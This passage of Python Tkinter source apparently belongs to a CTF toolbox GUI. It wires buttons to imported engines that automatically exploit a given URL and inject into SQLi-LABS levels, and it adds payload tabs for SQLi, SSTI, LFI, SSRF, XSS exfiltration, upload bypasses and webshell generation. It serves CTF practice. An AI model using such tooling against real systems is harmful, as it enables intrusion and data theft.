                            if hasattr(self, '_solve_bar') and self._solve_bar.winfo_exists():
                                self._solve_bar['value'] = pct
                                self._solve_bar_label.config(text=label)
                        except Exception:
                            pass
                    elif msg[0] == 'flag':
                        _, flag = msg
                        try:
                            if hasattr(self, '_solve_status') and self._solve_status.winfo_exists():
                                self._solve_status.config(text=f"🎉 找到Flag: {flag}", fg="#00FF00")
                            if hasattr(self, '_solve_bar') and self._solve_bar.winfo_exists():
                                self._solve_bar['value'] = 100
                                self._solve_bar_label.config(text="✅ 完成！")
                            self.after(100, lambda f=flag: tk.messagebox.showinfo(
                                "🎉 FLAG 已找到！", f"{f}", parent=self))
                        except Exception:
                            pass
            except queue.Empty:
                pass
            if not getattr(self, '_gui_done', False):
                self._gui_poll_id = self.after(50, _process_queue)

        _process_queue()  # Start periodic queue drain

        def _progress(stage, item, status):
            """Thread-safe progress: enqueue update for main thread."""
            if self._cancel_flag:
                return
            self._gui_queue.put(('progress', stage, item, status))

        def _bar(pct, label=""):
            """Thread-safe progress bar update: set percentage + label."""
            if self._cancel_flag:
                return
            self._gui_queue.put(('progress_bar', pct, label))

        _bar(5, "🔍 启动扫描引擎...")  # Initial progress

        def _found(flag):
            """Thread-safe flag found: enqueue update for main thread."""
            _dlog(f"FLAG callback: {flag}")
            self._gui_queue.put(('flag', flag))

        import threading
        def _run():
            final = None
            try:
                _bar(10, "🔍 指纹识别完成，构建攻击计划...")

                # ── Multi-Stage Mode: 全自动多阶段解题 ──
                if is_multi:
                    from .core.multi_stage import MultiStageEngine
                    _dlog("thread: MultiStageEngine imported")
                    _bar(15, "🔄 多阶段解题: 识别页面类型...")
                    self.after(0, lambda: self._solve_status.config(
                        text=f"🔄 多阶段解题: 弱口令→跳转→识别→攻击...", fg=GREEN))
                    ms_engine = MultiStageEngine(timeout=8, max_stages=5)
                    def _ms_progress(stage, item, status):
                        _progress(stage, item, status)
                        stage_pct_map = {
                            'multi': 10, 'stage': 25, 'page_type': 30,
                            'attack': 45, 'cred_try': 55, 'cred_found': 65,
                            'redirect': 75, 'xxe_hit': 85, 'xxe_confirmed': 90,
                            'sqli_hint': 60, 'ssti_hit': 85, 'rce_hit': 95,
                            'flag': 100,
                        }
                        if stage in stage_pct_map:
                            _bar(stage_pct_map[stage], f"{stage}: {str(item)[:30]}")
                    ms_result = ms_engine.solve(url, on_progress=_ms_progress, on_flag=_found) or {}
                    _dlog(f"thread: multi_stage done flag={str(ms_result.get('flag',''))[:20]}")
                    flag_val = ms_result.get('flag')
                    if flag_val:
                        stages_ms = [f"S{e['stage']}:{e['type']}→{e['result']}" for e in ms_result.get('attack_log', [])]
                        final = {
                            'flag': flag_val, 'vuln_confirmed': [],
                            'attacks_run': 0,
                            'stages': stages_ms,
                            'timing_ms': ms_result.get('timing_ms', 0),
                            'source': 'multi_stage',
                        }
                    else:
                        _dlog("thread: multi_stage no flag, trying auto_exploit")

                # ── Deep Scan Mode: AdvancedSolver first ──
                if is_deep:
                    from .core.advanced_scanner import AdvancedSolver
                    _dlog("thread: AdvancedSolver imported")
                    _bar(15, "🔬 深度扫描: 端口发现中...")
                    self.after(0, lambda: self._solve_status.config(
                        text=f"🔬 深度扫描中: 端口+字典+对比+攻击链...", fg=GREEN))
                    solver = AdvancedSolver()
                    # Wrap progress callback to also update progress bar
                    def _deep_progress(stage, item, status):
                        _progress(stage, item, status)
                        stage_pct = {
                            'ports': 20, 'dict_scan': 35, 'method': 50,
                            'diff': 60, 'chain': 70, 'chain_stage': 75,
                            'chain_flag': 95, 'flag': 100,
                        }
                        if stage in stage_pct:
                            _bar(stage_pct[stage], f"{stage}: {str(item)[:30]}")
                    deep_result = solver.deep_scan(url, analysis_result=result,
                        on_progress=_deep_progress, on_flag=_found) or {}
                    _dlog(f"thread: deep_scan done flag={str(deep_result.get('flag',''))[:20]}")
                    flag_val = deep_result.get('flag')
                    if flag_val:
                        final = {
                            'flag': flag_val, 'vuln_confirmed': [],
                            'attacks_run': 0,
                            'stages': deep_result.get('stages', []),
                            'timing_ms': deep_result.get('timing_ms', 0),
                            'source': deep_result.get('source', 'deep_scan'),
                        }
                    else:
                        _dlog("thread: deep_scan no flag, trying auto_exploit")

                if final is None:
                    _bar(80, "⚡ 并发攻击...")
                    from .core.url_analyzer import auto_exploit
                    _dlog("thread: auto_exploit imported")
                    self.after(0, lambda: self._solve_status.config(
                        text=f"🔍 并发攻击中...", fg=GREEN))
                    final = auto_exploit(url, results,
                        on_progress=_progress, on_found=_found,
                        fingerprint=fingerprint)
                    _dlog(f"thread: auto_exploit done flag={final.get('flag')[:20] if final.get('flag') else None}")
                # DUMP full debug log for diagnosis
                try:
                    with open('solve_debug.log', 'a', encoding='utf-8') as _f:
                        _f.write(f"=== {_t.strftime('%H:%M:%S')} ===\n")
                        _f.write('\n'.join(_log) + '\n')
                        _f.write(f"final keys: {list(final.keys())}\n")
                        _f.write(f"stages: {final.get('stages')}\n")
                        _f.write(f"flag: {final.get('flag')}\n")
                        _f.write(f"confirmed: {final.get('vuln_confirmed')}\n\n")
                except Exception:
                    pass
                flag = final.get("flag")
                confirmed = final.get("vuln_confirmed", [])
                attacks = final.get("attacks_run", 0)
                stages = final.get("stages", [])
                timing = final.get("timing_ms", 0)
                _dlog(f"thread: about to call _show_solve_result via after(0)")
                self.after(0, lambda: self._show_solve_result(
                    flag, confirmed, attacks, stages, timing=timing))
            except Exception as e:
                import traceback as _tb2
                _dlog(f"thread: EXCEPTION {e}")
                err_text = str(e) + "\n" + str(_tb2.format_exc())
                # Flush debug log to disk for diagnosis
                try:
                    with open('solve_debug.log', 'a', encoding='utf-8') as _f:
                        _f.write(f"=== EXCEPTION {_t.strftime('%H:%M:%S')} ===\n")
                        _f.write('\n'.join(_log) + '\n')
                        _f.write(err_text + '\n')
                except Exception:
                    pass
                # Sanitize for Tcl: remove null bytes and truncate
                err_text = err_text.replace('\x00', '').replace('\r', '')[:800]
                self.after(0, lambda et=err_text: self._show_solve_result(
                    None, [], 0, [], error=et))
        threading.Thread(target=_run, daemon=True).start()
        _dlog("thread started")

    def _cancel_attack(self):
        """Cancel the running attack."""
        self._cancel_flag = True
        try:
            from .core.url_analyzer import ConcurrentEngine
            # Signal all engines to stop
        except Exception:
            pass
        self._stop_btn.config(text="⏸ 已停止", state="disabled", bg="#333333")
        self._solve_status.config(text="⏸ 攻击已取消", fg=YELLOW)

    def _show_solve_result(self, flag, confirmed, attacks, stages, error=None, timing=None):
        """展示解题结果."""
        # Stop the GUI queue drain
        self._gui_done = True
        try:
            self._show_solve_result_inner(flag, confirmed, attacks, stages, error, timing)
        except Exception as e2:
            # Absolute last-resort fallback
            try:
                for w in list(self.result_frame.winfo_children()):
                    w.destroy()
                tk.Label(self.result_frame, text=f"显示结果失败: {e2}",
                    bg=BG, fg=RED, font=("Microsoft YaHei UI", 11)).pack(pady=20)
            except Exception:
                pass  # Completely broken, give up

    def _show_solve_result_inner(self, flag, confirmed, attacks, stages, error=None, timing=None):
        """Inner — already protected by wrapper."""
        # 清除所有子组件
        for w in list(self.result_frame.winfo_children()):
            w.destroy()
        rf = tk.Frame(self.result_frame, bg=BG)
        rf._is_solve_ui = True
        rf.pack(fill=tk.BOTH, expand=True, padx=6, pady=4)

        if error:
            _label(rf, f"错误: {error[:300]}", fg=RED, font_size=11, pady=20)
            tk.Button(rf, text="⬅️ 返回漏洞列表", command=self._go_back,
                bg=ACCENT, fg=DARK, font=("Microsoft YaHei UI", 10, "bold"),
                padx=14, pady=6, cursor="hand2", relief="flat").pack(pady=(20, 5))
            self._refresh_canvas()
            return

        if flag:
            self.status_label.config(text=f"🎉 FLAG: {flag}", fg="#00FF00")
            # ★ MessageBox确保一定看到
            self.after(150, lambda f=flag: tk.messagebox.showinfo("🎉 FLAG!", f"{f}", parent=self))
            # Flag卡片
            fc = tk.Frame(rf, bg="#0A1A0A", highlightthickness=2, highlightbackground="#00FF00")
            fc.pack(fill=tk.X, padx=10, pady=10, ipady=10)
            _label(fc, "🎉 FLAG 已找到！", fg="#00FF00", font_size=16, pady=(8, 0))
            fv = tk.Text(fc, bg=INPUT_BG, fg="#00FF00",
                font=("Cascadia Code", 14, "bold"), height=2, wrap=tk.WORD, bd=0, padx=14, pady=8)
            fv.pack(fill=tk.X, padx=14, pady=8)
            fv.insert("1.0", flag)
            fv.config(state="disabled")
            def _copy_flag(f=flag):
                self.clipboard_clear()
                self.clipboard_append(f)
                self.status_label.config(text="📋 Flag已复制!", fg=GREEN)
            tk.Button(fc, text="📋 复制Flag", command=_copy_flag,
                bg=ACCENT, fg=DARK, font=("Microsoft YaHei UI", 11, "bold"),
                padx=18, pady=6, cursor="hand2", relief="flat").pack(pady=(0, 8))
            # 攻击详情
            if confirmed:
                df = tk.Frame(rf, bg=INPUT_BG)
                df.pack(fill=tk.X, padx=6, pady=6)
                timing_str = f" | ⏱ {timing/1000:.1f}s" if timing else ""
                tk.Label(df, text=f"🔍 攻击详情 | 共 {attacks} 次{timing_str} | {', '.join(stages)}",
                    bg=INPUT_BG, fg=GREEN, font=("Microsoft YaHei UI", 10)).pack(anchor="w", padx=14, pady=(6, 2))
                for vc in confirmed[:6]:
                    p = vc.get('param', vc.get('location', ''))
                    pl = vc.get('payload', vc.get('location', ''))
                    tk.Label(df, text=f"  ✅ {vc['type']}/{p}: {pl[:40]}",
                        bg=INPUT_BG, fg=FG, font=("Cascadia Code", 8)).pack(anchor="w", padx=18)
        else:
            timing_str = f" | ⏱ {timing/1000:.1f}s" if timing else ""
            self.status_label.config(
                text=f"⚠️ 未找到Flag | {attacks}次攻击{timing_str} | 确认: {len(confirmed)}个", fg=YELLOW)
            _label(rf,
                f"⚠️ 自动解题未找到Flag\n\n共 {attacks} 次攻击{timing_str} | 确认 {len(confirmed)} 个漏洞\n阶段: {', '.join(stages) or '基础攻击'}",
                fg=YELLOW, font_size=12, pady=15)
            if confirmed:
                vf = tk.Frame(rf, bg=INPUT_BG)
                vf.pack(fill=tk.X, padx=6, pady=6)
                tk.Label(vf, text="✅ 已确认漏洞:", bg=INPUT_BG, fg=GREEN,
                    font=("Microsoft YaHei UI", 10, "bold")).pack(anchor="w", padx=14, pady=(6, 2))
                for vc in confirmed[:8]:
                    p = vc.get('param', vc.get('location', ''))
                    pl = vc.get('payload', vc.get('location', ''))
                    tk.Label(vf, text=f"  {vc['type']}/{p}: {pl[:40]}",
                        bg=INPUT_BG, fg=FG, font=("Cascadia Code", 9)).pack(anchor="w", padx=18)

        tk.Button(rf, text="⬅️ 返回漏洞列表", command=self._go_back,
            bg=ACCENT, fg=DARK, font=("Microsoft YaHei UI", 10, "bold"),
            padx=14, pady=6, cursor="hand2", relief="flat").pack(pady=(16, 8))
        self._refresh_canvas()

    def _refresh_canvas(self):
        """强制刷新Canvas滚动区域."""
        try:
            self.result_frame.update_idletasks()
            self.result_canvas.update_idletasks()
            self.result_canvas.configure(scrollregion=self.result_canvas.bbox("all"))
            self.result_canvas.yview_moveto(0)
        except Exception:
            pass


class JSGamePanel(tk.Frame):
    """JS/游戏挑战分析面板 — URL→自动提取Flag+作弊码+控制台命令."""

    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self._analyzing = False

        _label(self, "🎮 JS/游戏挑战分析器  —  Flag提取+作弊码+控制台命令",
               fg=ACCENT, font_size=16, bold=True, pady=8)

        # URL输入
        url_row = tk.Frame(self, bg=BG)
        url_row.pack(fill=tk.X, padx=10, pady=(4, 2))
        tk.Label(url_row, text="URL:", bg=BG, fg=FG, font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 6))
        self.url_entry = tk.Entry(url_row, bg=INPUT_BG, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 10), relief="flat", bd=1)
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.url_entry.bind("<Return>", lambda e: self._analyze())
        tk.Button(url_row, text="📋 Paste", command=self._paste,
            bg=INPUT_BG, fg=FG, font=("Microsoft YaHei UI", 9),
            padx=10, cursor="hand2", relief="flat").pack(side=tk.LEFT, padx=(6, 4))
        tk.Button(url_row, text="🔍 分析", command=self._analyze,
            bg=ACCENT, fg=DARK, font=("Microsoft YaHei UI", 10, "bold"),
            padx=16, pady=4, cursor="hand2", relief="flat").pack(side=tk.LEFT)

        self.status_label = tk.Label(self, text="💡 粘贴JS/游戏题URL，点「分析」或按Enter",
            bg=BG, fg=BORDER, font=("Microsoft YaHei UI", 9))
        self.status_label.pack(anchor="w", padx=12, pady=(2, 0))

        # 结果区
        result_outer = tk.Frame(self, bg=BG)
        result_outer.pack(fill=tk.BOTH, expand=True, padx=4)
        self.result_text = scrolledtext.ScrolledText(result_outer,
            bg=DARK, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 9), wrap=tk.WORD, relief="flat", bd=0)
        self.result_text.pack(fill=tk.BOTH, expand=True)

    def _paste(self):
        try:
            text = self.clipboard_get()
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, text.strip())
        except Exception:
            pass

    def _log(self, msg):
        self.result_text.insert(tk.END, msg + "\n")
        self.result_text.see(tk.END)
        self.result_text.update_idletasks()

    def _analyze(self):
        if self._analyzing:
            return
        url = self.url_entry.get().strip()
        if not url:
            self._log("⚠ 请输入URL")
            return

        self._analyzing = True
        self.result_text.delete("1.0", tk.END)
        self.status_label.config(text="🔍 正在分析JS...", fg=YELLOW)

        import threading
        def _run():
            try:
                solver = JSChallengeSolver(verbose=False)
                report = solver.analyze(url)
                self.after(0, lambda: self._show_result(report))
            except Exception as e:
                import traceback as _tb
                self.after(0, lambda: self._on_error(str(e) + "\n" + _tb.format_exc()))
        threading.Thread(target=_run, daemon=True).start()

    def _show_result(self, report):
        self._log("=" * 60)
        if report.title:
            self._log(f"  页面: {report.title}")
        if report.game_type != "unknown":
            self._log(f"  游戏类型: {report.game_type}")
        self._log(f"  摘要: {report.summary}")
        self._log("=" * 60)

        if report.flags_found:
            self._log(f"\n🏁 Flag ({len(report.flags_found)}):")
            for f in report.flags_found:
                self._log(f"  ✅ {f}")

        if report.cheat_codes:
            self._log(f"\n🎮 作弊码:")
            for c in report.cheat_codes:
                self._log(f"  🔑 {c}")

        if report.console_commands:
            self._log(f"\n💻 浏览器控制台命令 (F12 → Console 粘贴):")
            for c in report.console_commands:
                # 不显示注释行
                if not c.strip().startswith("//"):
                    self._log(f"  > {c}")
            self._log(f"\n  # 也可复制全部命令自动执行")
            for c in report.console_commands:
                self._log(f"  {c}")

        if report.js_files:
            self._log(f"\n📜 JS 文件:")
            for f in report.js_files:
                self._log(f"  {f.split('/')[-1]}")

        if report.api_endpoints:
            self._log(f"\n🌐 API 端点:")
            for e in report.api_endpoints:
                self._log(f"  {e}")

        self._analyzing = False
        ok = bool(report.flags_found)
        self.status_label.config(
            text=f"{'✅' if ok else '⚠'} 分析完成 | {'Flag已获取' if ok else '未发现Flag'}",
            fg=GREEN if ok else YELLOW)

    def _on_error(self, msg):
        self._log(f"\n❌ 错误: {msg[:500]}")
        self._analyzing = False
        self.status_label.config(text="❌ 分析异常", fg=RED)


class SQLLabsPanel(tk.Frame):
    """SQLi-LABS 靶场专项面板：关卡选择→自动注入→提取数据."""

    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self.engine = None
        self._solving = False

        # ── 标题 ──
        _label(self, "🔫 SQLi-LABS 专项求解器  —  65+关卡自动注入+数据提取",
               fg=ACCENT, font_size=16, bold=True, pady=8)

        # ── 靶场URL配置 ──
        url_row = tk.Frame(self, bg=BG)
        url_row.pack(fill=tk.X, padx=10, pady=(4, 2))
        tk.Label(url_row, text="靶场:", bg=BG, fg=FG, font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 6))
        self.url_entry = tk.Entry(url_row, bg=INPUT_BG, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 10), relief="flat", bd=1)
        self.url_entry.insert(0, "http://80-d81dd610-1f3d-45b2-bccd-cf64012932fd.challenge.ctfplus.cn")
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

        # ── 关卡选择行 ──
        select_row = tk.Frame(self, bg=BG)
        select_row.pack(fill=tk.X, padx=10, pady=(6, 2))

        tk.Label(select_row, text="关卡:", bg=BG, fg=FG, font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 6))
        self.lesson_entry = tk.Entry(select_row, bg=INPUT_BG, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 11), width=6, relief="flat", bd=1)
        self.lesson_entry.insert(0, "1")
        self.lesson_entry.pack(side=tk.LEFT, padx=(0, 6))
        self.lesson_entry.bind("<Return>", lambda e: self._solve_one())

        tk.Label(select_row, text="~", bg=BG, fg=FG, font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 6))
        self.end_entry = tk.Entry(select_row, bg=INPUT_BG, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 11), width=6, relief="flat", bd=1)
        self.end_entry.insert(0, "65")
        self.end_entry.pack(side=tk.LEFT, padx=(0, 12))

        # 按钮
        self.solve_btn = tk.Button(select_row, text="🚀 求解当前关", command=self._solve_one,
            bg=ACCENT, fg=DARK, font=("Microsoft YaHei UI", 10, "bold"),
            padx=14, pady=4, cursor="hand2", relief="flat")
        self.solve_btn.pack(side=tk.LEFT, padx=(0, 6))

        self.batch_btn = tk.Button(select_row, text="📦 批量求解", command=self._solve_batch,
            bg="#9933CC", fg="#ffffff", font=("Microsoft YaHei UI", 10, "bold"),
            padx=14, pady=4, cursor="hand2", relief="flat")
        self.batch_btn.pack(side=tk.LEFT, padx=(0, 6))

        self.list_btn = tk.Button(select_row, text="📋 关卡列表", command=self._list_lessons,
            bg=INPUT_BG, fg=FG, font=("Microsoft YaHei UI", 10),
            padx=12, pady=4, cursor="hand2", relief="flat")
        self.list_btn.pack(side=tk.LEFT, padx=(0, 6))

        self.stop_btn = tk.Button(select_row, text="⏹ 停止", command=self._stop,
            bg="#CC3333", fg="#ffffff", font=("Microsoft YaHei UI", 10),
            padx=12, pady=4, cursor="hand2", relief="flat", state="disabled")
        self.stop_btn.pack(side=tk.LEFT)

        # ── 状态栏 ──
        self.status_label = tk.Label(self, text="💡 输入关卡号，点「求解当前关」或按Enter开始",
            bg=BG, fg=BORDER, font=("Microsoft YaHei UI", 9))
        self.status_label.pack(anchor="w", padx=12, pady=(4, 0))

        # ── 进度条 ──
        self.progress = ttk.Progressbar(self, mode="determinate", length=800)
        self.progress.pack(fill=tk.X, padx=12, pady=(4, 0))

        # ── 结果区 ──
        result_outer = tk.Frame(self, bg=BG)
        result_outer.pack(fill=tk.BOTH, expand=True, padx=4)
        self.result_text = scrolledtext.ScrolledText(result_outer,
            bg=DARK, fg=FG, insertbackground=FG,
            font=("Cascadia Code", 9), wrap=tk.WORD, relief="flat", bd=0)
        self.result_text.pack(fill=tk.BOTH, expand=True)

    def _get_engine(self):
        url = self.url_entry.get().strip()
        if not self.engine or self.engine.base_url != url.rstrip("/"):
            self.engine = SQLLabsEngine(url, verbose=False)
        return self.engine

    def _log(self, msg):
        self.result_text.insert(tk.END, msg + "\n")
        self.result_text.see(tk.END)
        self.result_text.update_idletasks()

    def _solve_one(self):
        if self._solving:
            return
        try:
            num = int(self.lesson_entry.get().strip())
        except ValueError:
            self._log("⚠ 请输入有效的关卡号")
            return

        self._start_solve()
        import threading
        def _run():
            try:
                engine = self._get_engine()
                # Override verbose for GUI output
                original_verbose = engine.verbose
                engine.verbose = False
                r = engine.solve_lesson(num)
                engine.verbose = original_verbose
                self.after(0, lambda: self._show_single_result(r))
            except Exception as e:
                import traceback as _tb
                self.after(0, lambda: self._on_error(str(e) + "\n" + _tb.format_exc()))
        threading.Thread(target=_run, daemon=True).start()

    def _solve_batch(self):
        if self._solving:
            return
        try:
            start = int(self.lesson_entry.get().strip())
            end = int(self.end_entry.get().strip())
        except ValueError:
            self._log("⚠ 请输入有效的关卡范围")
            return

        self._start_solve()
        import threading
        def _run():
            results = []
            total_lessons = [n for n in range(start, end + 1) if n in LESSON_DB]
            engine = self._get_engine()
            for i, num in enumerate(total_lessons):
                if not self._solving:
                    break
                pct = int((i / len(total_lessons)) * 100)
                self.after(0, lambda p=pct, n=num, idx=i+1, tot=len(total_lessons):
                    self._update_progress(f"Less-{n} ({idx}/{tot})...", p))
                try:
                    engine.verbose = False
                    r = engine.solve_lesson(num)
                    results.append(r)
                except Exception as e:
                    results.append({"lesson": num, "success": False, "error": str(e)})
                if not self._solving:
                    break
                time.sleep(0.3)
            solved = sum(1 for r in results if r.get("success"))
            flags = [r.get("flag") for r in results if r.get("flag")]
            self.after(0, lambda: self._show_batch_result(results, solved, flags))
        threading.Thread(target=_run, daemon=True).start()

    def _list_lessons(self):
        self._log("=" * 80)
        self._log(f"{'ID':>4}  {'类型':<18} {'方法':<7} {'难度':<6}  {'标题'}")
        self._log("-" * 80)
        for num in sorted(LESSON_DB.keys()):
            if num % 10 == 0:
                self._log("-" * 80)
            l = LESSON_DB[num]
            diff = "⭐" * l.difficulty
            self._log(f"{num:>4}  {l.injection_type:<18} {l.method:<7} {diff:<7} {l.title}")
        self._log("=" * 80)

    def _start_solve(self):
        self._solving = True
        self.solve_btn.config(state="disabled", text="⏳ 求解中...")
        self.batch_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.result_text.delete("1.0", tk.END)
        self.progress["value"] = 0
        self.status_label.config(text="⏳ 正在求解...", fg=YELLOW)

    def _stop(self):
        self._solving = False
        self.solve_btn.config(state="normal", text="🚀 求解当前关")
        self.batch_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_label.config(text="⏹ 已停止", fg=BORDER)
        self._log("\n⏹ 求解已停止")

    def _update_progress(self, msg, pct):
        self.progress["value"] = pct
        self.status_label.config(text=msg, fg=YELLOW)

    def _finish_solve(self, msg, ok=True):
        self._solving = False
        self.solve_btn.config(state="normal", text="🚀 求解当前关")
        self.batch_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.progress["value"] = 100
        self.status_label.config(text=msg, fg=GREEN if ok else RED)

    def _show_single_result(self, r):
        self._log("=" * 60)
        self._log(f"  Lesson: Less-{r.get('lesson', '?')}")
        self._log(f"  Title: {r.get('title', '?')}")
        self._log(f"  Success: {'✅' if r.get('success') else '❌'}")
        self._log(f"  Quote Type: {r.get('quote_type', '?')}")
        self._log("-" * 60)
        if r.get("flag"):
            self._log(f"  🏁 Flag: {r['flag']}")
        if r.get("database"):
            self._log(f"  📦 Database: {r['database']}")
        if r.get("tables"):
            tables = r["tables"]
            self._log(f"  📊 Tables ({len(tables)}): {', '.join(tables[:15])}" + ("..." if len(tables) > 15 else ""))
        if r.get("data"):
            self._log("  📋 Data:")
            for k, v in r["data"].items():
                self._log(f"    {k}: {v[:120]}")
        if r.get("columns"):
            self._log("  🗂 Columns:")
            for tbl, cols in r["columns"].items():
                self._log(f"    {tbl}: {', '.join(cols)}")
        if r.get("error"):
            self._log(f"  ⚠ Error: {r['error']}")
        self._log("=" * 60)
        ok = r.get("success", False)
        flag = r.get("flag", "")
        msg = f"✅ Less-{r.get('lesson','?')} 完成" + (f" | Flag: {flag}" if flag else "")
        self._finish_solve(msg, ok)

    def _show_batch_result(self, results, solved, flags):
        self._log("=" * 60)
        self._log(f"  批量求解完成: {solved}/{len(results)} 成功")
        self._log("-" * 60)
        for r in results:
            icon = "✅" if r.get("success") else "❌"
            flag = r.get("flag", "")
            db = r.get("database", "")
            extra = f" | DB={db}" if db else ""
            extra += f" | Flag={flag}" if flag else ""
            self._log(f"  {icon} Less-{r.get('lesson','?'):>3}  {extra}")
        if flags:
            self._log("-" * 60)
            self._log(f"  🏁 Flags ({len(flags)}):")
            for f in flags:
                self._log(f"    {f}")
        self._log("=" * 60)
        msg = f"✅ 批量完成: {solved}/{len(results)} 成功"
        if flags:
            msg += f" | {len(flags)} flags"
        self._finish_solve(msg, solved > 0)

    def _on_error(self, msg):
        self._log(f"\n❌ 错误: {msg[:500]}")
        self._finish_solve("❌ 求解异常", False)


def run_gui():

    root = tk.Tk()

    root.title("Yang-Web Arsenal v3.6 — 全能CTF工具箱")

    root.geometry("1100x720")

    root.minsize(900, 600)

    apply_theme(root)



    # ── 状态: gui 还是 cli ──

    mode = {"current": "gui"}



    # ── 顶部标题栏 ──

    header = tk.Frame(root, bg=DARK, height=52)

    header.pack(fill=tk.X)

    header.pack_propagate(False)

    tk.Label(header, text="🔧  Yang-Web", bg=DARK, fg=ACCENT,

             font=("Cascadia Code", 16, "bold")).pack(side=tk.LEFT, padx=20, pady=10)



    mode_label = tk.Label(header, text="全能 CTF 工具箱 v3.6  ·  50+ 模块 + 8大负载 + 7引擎 + 字典扫描 + 多阶段", 

             bg=DARK, fg=YELLOW, font=("Microsoft YaHei UI", 9))

    mode_label.pack(side=tk.LEFT, pady=14)



    # ── 切换按钮 ──

    toggle_btn = tk.Button(header, text="💻 CLI",

                           bg=INPUT_BG, fg=ACCENT, relief="flat", borderwidth=1,

                           padx=14, pady=4, cursor="hand2",

                           font=("Microsoft YaHei UI", 9, "bold"),

                           activebackground=BORDER, activeforeground=ACCENT)

    toggle_btn.pack(side=tk.RIGHT, padx=16, pady=10)



    # ── 内容容器 ──

    content = tk.Frame(root, bg=BG)

    content.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)



    # GUI 模式 — Notebook

    gui_frame = tk.Frame(content, bg=BG)

    notebook = ttk.Notebook(gui_frame)

    notebook.pack(fill=tk.BOTH, expand=True)



    # ★ 智能攻击面板
    url_attack_panel = UrlAttackPanel(notebook)
    notebook.add(url_attack_panel, text=" 🎯 智能攻击 ")

    # 解码

    decode_panel = DecodePanel(notebook)

    notebook.add(decode_panel, text=" 🔓 解码 ")



    # Payload 面板们

    def _add_payload_tab(title, emoji, get_fn, categories=None, search_fn=None, analyzer_fn=None):

        """Add a payload tab with optional category dropdown."""

        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn, analyzer_fn)

        if categories:

            panel.set_categories(categories)

        notebook.add(panel, text=f" {emoji} {title} ")

        return panel



    _add_payload_tab("SSTI", "🎨", ssti.get_exploit,

                     categories=list(ssti.EXPLOIT.keys()))

    _add_payload_tab("SQLi", "🗄️", sqli.get_exploit,

                     categories=list(sqli.EXPLOIT.keys()),

                     search_fn=sqli.search_payload)



    # ── LFI ──

    def _lfi_get(cat):

        data = {

            "路径遍历": {"路径遍历Payload": lfi.get_path_traversal()},

            "敏感文件(Linux)": lfi.get_sensitive_files("Linux"),

            "敏感文件(Windows)": lfi.get_sensitive_files("Windows"),

            "PHP伪协议": lfi.get_php_wrappers(),

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("LFI", "📂", _lfi_get,

                     categories=["路径遍历", "敏感文件(Linux)", "敏感文件(Windows)", "PHP伪协议"])



    # ── SSRF ──

    def _ssrf_get(cat):

        data = {

            "云元数据": ssrf.get_cloud_metadata(),

            "绕过技巧": {"SSRF Bypass": ssrf.get_bypass()},

            "常见端口": ssrf.get_common_ports(),

            "内网地址": {"内网IP段": ssrf.get_internal_ranges()},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("SSRF", "🌐", _ssrf_get,

                     categories=["云元数据", "绕过技巧", "常见端口", "内网地址"])



    # ── XSS ──

    def _xss_get(cat):

        data = {

            "检测Payload": {"XSS检测": xss.get_detection()},

            "数据外传": {"Exfiltration": xss.get_exfiltration()},

            "WAF绕过": xss.get_bypass(),

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("XSS", "💉", _xss_get,

                     categories=["检测Payload", "数据外传", "WAF绕过"])



    # ── PHP ──

    def _php_get(cat):

        data = {

            "Magic Hash": {"MD5(0e...)": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15]},

            "弱类型比较": {k: [i.get("example", str(i)) for i in v]

                        for k, v in php.TYPE_JUGGLING.items()},

            "RCE Bypass": {"常见绕过": php.PHP_RCE_BYPASS.get("常见命令执行函数", [])[:15]},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("PHP", "🐘", _php_get,

                     categories=["Magic Hash", "弱类型比较", "RCE Bypass"])



    # ── Upload ──

    def _upload_get(cat):

        """Get upload payloads, filtered by category."""

        ext_sections = {}

        for k, v in upload.EXT_BYPASS.items():

            ext_sections[k] = v

        mime_items = []

        for k, v in upload.MIME_HEADER_FAKE.items():

            mime_items.append(f"{k}: Content-Type={v['Content-Type']}  |  文件头={v['文件头hex']}")

        content_sections = {}

        for k, v in upload.CONTENT_BYPASS.items():

            content_sections[k] = v

        all_data = {

            "后缀绕过": ext_sections,

            "大小写混淆": {"大小写混合": upload.EXT_BYPASS.get("大小写混合", [])},

            "多后缀组合": {"多后缀组合": upload.EXT_BYPASS.get("多后缀组合", [])},

            "NTFS & 空格点": {

                "NTFS 数据流": upload.EXT_BYPASS.get("NTFS 数据流 (Win)", []),

                "空格/点技巧": upload.EXT_BYPASS.get("空格/点技巧 (Win)", []),

            },

            "路径截断": {"路径截断": upload.EXT_BYPASS.get("路径截断", [])},

            "MIME伪造": {"Content-Type & 文件头": mime_items},

            "图片马内容绕过": content_sections,

            "一句话木马": {

                "eval版": [upload.generate_image_shell("eval")],

                "system版": [upload.generate_image_shell("system")],

                "极简版": [upload.generate_image_shell("one_liner")],

            },

            ".htaccess/.user.ini": {

                ".htaccess": [upload.generate_htaccess()],

                ".user.ini": [upload.generate_userini(), upload.generate_userini("shell.jpg")],

            },

            "高级技巧": {},

        }

        try:

            if hasattr(upload, 'ADVANCED_BYPASS'):

                all_data["高级技巧"] = upload.ADVANCED_BYPASS

        except Exception:

            pass

        try:

